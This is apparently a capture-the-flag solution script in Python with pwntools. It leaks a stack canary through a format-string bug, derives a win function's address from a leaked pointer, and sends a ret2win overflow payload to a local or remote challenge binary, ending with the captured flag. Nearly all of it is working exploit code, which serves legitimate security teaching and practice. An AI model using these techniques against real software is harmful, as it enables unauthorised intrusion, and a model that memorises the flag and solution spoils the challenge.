#vuln = random + 0000000000001479
#win = random + 000000000000145f
#vuln = oops

#vuln  - 0000000000001479 = random
#random = vuln - 0000000000001479

#win - 000000000000145f = random
#random = win - 000000000000145f

#vuln - 0000000000001479 = win - 000000000000145f
#win = oops - 0000000000001479 + 000000000000145f
#win = oops - 26


# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def fuzz_canary():
    for i in range(19, 20): #got canary at offset + 19
        p = conn()
        if args.REMOTE:
            p.sendline(b"13523090")
            p.sendline(b"5")

        p.sendlineafter(b"Is it fatal tho?\n", f"%{i}$p".encode())
        response = p.recvline(timeout=5).decode().strip()
        print(f"{i}: {response}")
        
    p.close()

def leak_win(p, oops_addr):
    offset = 104

    # win = oops - 26
    win_addr = oops_addr - 26
    info(f"Calculated win address: {hex(win_addr)}")

    # Leak canary value (19rd on stack)
    p.sendlineafter(b"Is it fatal tho?\n", "%{}$p".format(19).encode())
    canary = int(p.recvline().strip().split()[-1], 16)
    print(f"Canary: {hex(canary)}")
    info('canary = 0x%x (%d)', canary, canary)

    # ret2win
    payload = flat([
        offset * b'A',  # Pad to canary
        canary,        # Our leaked canary
        8 * b'B',      # Pad to Ret pointer
        p64(win_addr)       # Calculated win address
    ])

    return payload

def solve(): 
    p = conn()
    if args.REMOTE:
        p.sendline("13523090")
        p.sendline("6")

    exe = './6'
    context.binary = ELF(exe, checksec=False)
    context.log_level = 'debug'

    # Take vuln addr
    p.recvuntil(b"Oops: ")
    oops_addr = int(p.recvline().strip(), 16)
    log.info(f"Extracted oops address: {hex(oops_addr)}")

    # Calculate win addr from vuln
    payload = leak_win(p, oops_addr)

    log.info(f"Payload: {payload}")

    p.sendline(payload)
    p.interactive()

solve()

# Orkom3{I'll play the bad guy~_9fa36a74296a4666}